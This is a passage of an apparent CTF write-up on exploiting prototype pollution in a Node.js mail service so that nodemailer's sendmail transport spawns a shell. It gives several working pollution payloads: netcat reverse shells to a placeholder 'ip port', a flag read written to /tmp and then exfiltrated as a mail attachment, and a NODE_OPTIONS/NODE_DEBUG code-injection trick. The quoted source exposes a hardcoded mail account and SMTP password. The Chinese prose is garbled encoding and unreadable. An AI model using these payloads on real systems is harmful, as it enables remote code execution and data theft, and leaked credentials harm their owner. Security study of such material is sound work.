<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">           sendmail = <span class="variable language_">this</span>.<span class="title function_">_spawn</span>(<span class="variable language_">this</span>.<span class="property">path</span>, args);</span><br><span class="line">       &#125; <span class="keyword">catch</span> (E) &#123;</span><br><span class="line">           <span class="variable language_">this</span>.<span class="property">logger</span>.<span class="title function_">error</span>(</span><br><span class="line">               &#123;</span><br><span class="line">                   <span class="attr">err</span>: E,</span><br><span class="line">                   <span class="attr">tnx</span>: <span class="string">&#x27;spawn&#x27;</span>,</span><br><span class="line">                   messageId</span><br><span class="line">               &#125;,</span><br><span class="line">               <span class="string">&#x27;Error occurred while spawning sendmail. %s&#x27;</span>,</span><br><span class="line">               E.<span class="property">message</span></span><br><span class="line">           );</span><br><span class="line">           <span class="keyword">return</span> <span class="title function_">callback</span>(E);</span><br><span class="line">       &#125;</span><br></pre></td></tr></table></figure>

<p>è·Ÿè¿›<code>this.path</code></p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (options) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="keyword">typeof</span> options === <span class="string">&#x27;string&#x27;</span>) &#123;</span><br><span class="line">                <span class="variable language_">this</span>.<span class="property">path</span> = options;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="keyword">typeof</span> options === <span class="string">&#x27;object&#x27;</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (options.<span class="property">path</span>) &#123;</span><br><span class="line">                    <span class="variable language_">this</span>.<span class="property">path</span> = options.<span class="property">path</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> (<span class="title class_">Array</span>.<span class="title function_">isArray</span>(options.<span class="property">args</span>)) &#123;</span><br><span class="line">                    <span class="variable language_">this</span>.<span class="property">args</span> = options.<span class="property">args</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="variable language_">this</span>.<span class="property">winbreak</span> = [<span class="string">&#x27;win&#x27;</span>, <span class="string">&#x27;windows&#x27;</span>, <span class="string">&#x27;dos&#x27;</span>, <span class="string">&#x27;\r\n&#x27;</span>].<span class="title function_">includes</span>((options.<span class="property">newline</span> || <span class="string">&#x27;&#x27;</span>).<span class="title function_">toString</span>().<span class="title function_">toLowerCase</span>());</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>å¯ä»¥åœ¨è¿™é‡Œçœ‹åˆ°è¦ç»™<code>this.path</code>èµ‹å€¼çš„æ¡ä»¶æ˜¯<code>options</code>çš„ç±»å‹è¦æ˜¯å¯¹è±¡å’Œ<code>option</code>çš„<code>args</code>å±æ€§æ˜¯æ•°ç»„ã€‚</p>
<p>æ¥ç€è¦åšçš„æ˜¯æ£€æŸ¥å¦‚ä½•è§¦å‘</p>
<p>å›åˆ°<code>mail.js</code></p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> nodemailer = <span class="built_in">require</span>(<span class="string">&quot;nodemailer&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">send</span>(<span class="params">contents</span>) &#123;</span><br><span class="line">  <span class="keyword">let</span> transporter = nodemailer.<span class="title function_">createTransport</span>(&#123;</span><br><span class="line">    <span class="attr">service</span>: <span class="string">&quot;qq&quot;</span>, <span class="comment">// Plz use your own smtp server for testing</span></span><br><span class="line">    <span class="attr">port</span>: <span class="number">465</span>,</span><br><span class="line">    <span class="attr">secureConnection</span>: <span class="literal">true</span>,</span><br><span class="line">    <span class="attr">auth</span>: &#123;</span><br><span class="line">      <span class="attr">user</span>: <span class="string">&quot;2449970596@qq.com&quot;</span>,</span><br><span class="line">      <span class="attr">pass</span>: <span class="string">&quot;qlwwytxigkuzebdf&quot;</span>,</span><br><span class="line">    &#125;,</span><br><span class="line">  &#125;);</span><br><span class="line">  <span class="keyword">return</span> transporter.<span class="title function_">sendMail</span>(contents);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = send;</span><br></pre></td></tr></table></figure>

<p>è¿™è¾¹å¯ä»¥ç»§ç»­è·Ÿè¿›çš„åœ°æ–¹æ˜¯<code>createTransport</code>ï¼ˆæ²¡åŠæ³•é€è¡ŒdebugçœŸéº»çƒ¦ã€‚ã€‚è¿˜è¦è‡ªå·±æ‰¾ï¼‰</p>
<p>åœ¨<code>node_modules\nodemailer\lib\nodemailer.js</code>ä¸­å¯ä»¥æ‰¾åˆ°å¦‚ä¸‹æºç </p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span>.<span class="property">createTransport</span> = <span class="keyword">function</span> (<span class="params">transporter, defaults</span>) &#123;</span><br><span class="line">....</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (options.<span class="property">pool</span>) &#123;</span><br><span class="line">            transporter = <span class="keyword">new</span> <span class="title class_">SMTPPool</span>(options);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (options.<span class="property">sendmail</span>) &#123;</span><br><span class="line">            transporter = <span class="keyword">new</span> <span class="title class_">SendmailTransport</span>(options);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (options.<span class="property">streamTransport</span>) &#123;</span><br><span class="line">            transporter = <span class="keyword">new</span> <span class="title class_">StreamTransport</span>(options);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (options.<span class="property">jsonTransport</span>) &#123;</span><br><span class="line">....</span><br></pre></td></tr></table></figure>

<p>åªè¦<code>options.sendmail</code>çš„å€¼ä¸ºçœŸï¼Œå°±ä¼šå®ä¾‹åŒ–<code>SendmailTransport</code>ç±»ï¼Œä¹Ÿå°±æ˜¯æˆ‘ä»¬ä¸Šé¢è¦è¿›è¡ŒåŸå‹é“¾æ±¡æŸ“çš„ç±»</p>
<p>è‡³æ­¤å¯ä»¥å°è¯•æ„é€ åŸå‹é“¾æ±¡æŸ“å¦‚ä¸‹</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">	&quot;constructor.prototype.sendmail&quot;:true,</span><br><span class="line">	&quot;constructor.prototype.path&quot;:&quot;sh&quot;,</span><br><span class="line">	&quot;constructor.prototype.args&quot;:[&quot;-c&quot;,&quot;nc ip port -e /bin/sh&quot;]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>è¿™ä¸ªpocæ˜¯ç”¨äºåå¼¹shellçš„ï¼Œå› ä¸ºæˆ‘çš„SMTPæœåŠ¡å™¨é…ç½®æœ‰é—®é¢˜ï¼Œæ‰€ä»¥åªèƒ½è¿™æ ·åšã€‚</p>
<p><img src="/../../img/8-bit%20pub-images/6.png"></p>
<p><img src="/../../img/8-bit%20pub-images/5.png"></p>
<p>è¿™è¾¹æ”¾ä¸€ä¸‹å…¶ä»–å¸ˆå‚…é€šè¿‡ä»»æ„è¯»æ–‡è·å¾—flagçš„æ–¹å¼</p>
<p>åœ¨nodemaileræ–‡æ¡£ä¸­å‘ç°ä½¿ç”¨attachments å¯ä»¥è¿›è¡Œä»»æ„æ–‡ä»¶è¯»å–</p>
<p>å…ˆæŠŠæ–‡ä»¶å†™åˆ°tmpç›®å½•ä¸‹</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;constructor.prototype.sendmail&quot;</span>:<span class="literal">true</span>,</span><br><span class="line">    <span class="string">&quot;constructor.prototype.path&quot;</span>:<span class="string">&quot;sh&quot;</span>,</span><br><span class="line">    <span class="string">&quot;constructor.prototype.args&quot;</span>:[</span><br><span class="line">        <span class="string">&quot;-c&quot;</span>,</span><br><span class="line">        <span class="string">&quot;/readflag &gt; /tmp/flag.txt&quot;</span></span><br><span class="line">    ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å†åˆ©ç”¨attachmentså¸¦å‡º</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;to&quot;</span>:<span class="string">&quot;i@example.com&quot;</span>,</span><br><span class="line">    <span class="string">&quot;subject&quot;</span>:<span class="string">&quot;flag&quot;</span>,</span><br><span class="line">    <span class="string">&quot;constructor.prototype.attachments&quot;</span>:[</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="string">&quot;filename&quot;</span>:<span class="string">&quot;flag.txt&quot;</span>,</span><br><span class="line">            <span class="string">&quot;path&quot;</span>:<span class="string">&quot;/tmp/flag.txt&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">    ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>ä»¥ä¸‹æ˜¯ä¹‹å‰æ„é€ é”™è¯¯çš„åŸå‹é“¾ï¼Œæ²¡æœ‰åŒå¼•å·ï¼Œç­‰å·å½“å†’å·ç”¨ï¼Œncåå¼¹shellæ ¼å¼å‡ºé”™ã€‚ã€‚ç”¨äºæé†’è‡ªå·±</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">	constructor.prototype.path=bash</span><br><span class="line">	constructor.prototype.args=[nc,ip,port]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h4 id="æ–¹æ³•äºŒ"><a href="#æ–¹æ³•äºŒ" class="headerlink" title="æ–¹æ³•äºŒ"></a>æ–¹æ³•äºŒ</h4><p>è¿˜æœ‰ä¸€ä¸ªæ–¹æ³•æ˜¯æ±¡æŸ“åŸå‹é“¾ï¼Œå…ˆæ”¾ä¸ªå…¶ä»–å¸ˆå‚…çš„åšå®¢ï¼Œåé¢å†ç ”ç©¶</p>
<blockquote>
<p>è¿™é‡Œå°±æ¯”è¾ƒç›´æ¥äº†ï¼Œå› ä¸ºnodemaileræ˜¯æœ‰require<code>child_process</code>åº“çš„ï¼Œé‚£ä¹ˆæˆ‘ä»¬å¯ä»¥ä½¿ç”¨<a target="_blank" rel="noopener" href="https://blog.p6.is/Abusing-Environment-Variables/">Abusing Environment Variables (p6.is)</a>æ–¹æ³•ï¼Œæ±¡æŸ“envå’Œshellï¼Œå…ˆæ”¾payload</p>
</blockquote>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;constructor.prototype.sendmail&quot;</span><span class="punctuation">:</span> True<span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;constructor.prototype.shell&quot;</span><span class="punctuation">:</span><span class="string">&quot;node&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;constructor.prototype.env.NODE_DEBUG&quot;</span><span class="punctuation">:</span> <span class="string">&quot;require(&#x27;child_process&#x27;).execSync(&#x27;nc ip port -e /bin/bash&#x27;);process.exit();//&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;constructor.prototype.env.NODE_OPTIONS&quot;</span><span class="punctuation">:</span><span class="string">&quot;-r /proc/self/environ&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>è¿™é‡Œæ±¡æŸ“äº†ç¯å¢ƒå˜é‡ä¹‹åï¼Œæ¯æ¬¡ä»¥nodeæ‰§è¡Œå‘½ä»¤çš„æ—¶å€™ï¼Œå°±ä¼šåŠ è½½<code>NODE_OPTIONS</code>é€‰é¡¹ï¼Œä»è€Œæ‰§è¡Œ<code>/proc/self/environ</code>ä¸­å­˜åœ¨çš„jsä»£ç ï¼Œé‚£ä¹ˆå°±å¾ˆç®€å•äº†ï¼Œå½“é»˜è®¤ä½¿ç”¨å‘é‚®ä»¶çš„æ—¶å€™ï¼Œspawnä¼šè°ƒç”¨é»˜è®¤çš„shellï¼Œä¹Ÿå°±æ˜¯&#x2F;bin&#x2F;sh</p>
</blockquote>
<p>å‚è€ƒèµ„æ–™ï¼š</p>
<p>47.103.121.189&#x2F;2023&#x2F;04&#x2F;20&#x2F;ç½‘é¼æ¯2023çº¿ä¸‹åŠå†³èµ›çªç ´é¢˜errormsgå¤ç°&#x2F;</p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/lllffg/article/details/114548517">https://blog.csdn.net/lllffg/article/details/114548517</a></p>

    </div>
</article>
<!--æŠŠhiglightAllæ”¾åˆ°æœ€åï¼Œç¡®ä¿DOMéƒ½åŠ è½½å®Œæˆ-->
<script>hljs.highlightAll();</script>
<script src="/js/codeblock.js"></script>

<!--æ˜¾ç¤ºæ–‡ç« é¡µç›¸å…³å†…å®¹-->
            <!--bodyæ˜¯ä¸€ä¸ªå˜é‡ï¼Œä»£è¡¨é¡µé¢çš„ä¸»è¦å†…å®¹ã€‚åœ¨æ¸²æŸ“æ¨¡æ¿æ—¶ï¼Œè¿™ä¸ªå˜é‡ä¼šè¢«æ›¿æ¢ä¸ºå®é™…çš„å†…å®¹ã€‚-->
            
            <div style="border-bottom:1px solid #eaedf3;"></div>

            <footer class="footer">
    <p>s4mmy &copy; 2025&nbsp;| &nbsp;Recorded for better expressionğŸ§¡&nbsp;|
        <a href="https://github.com/s4mmyyy/hexo-theme-life" target="_blank" class="theme">&nbsp;Theme</a>
    
    </p>
</footer>
        </div>
        
    </body>
</html>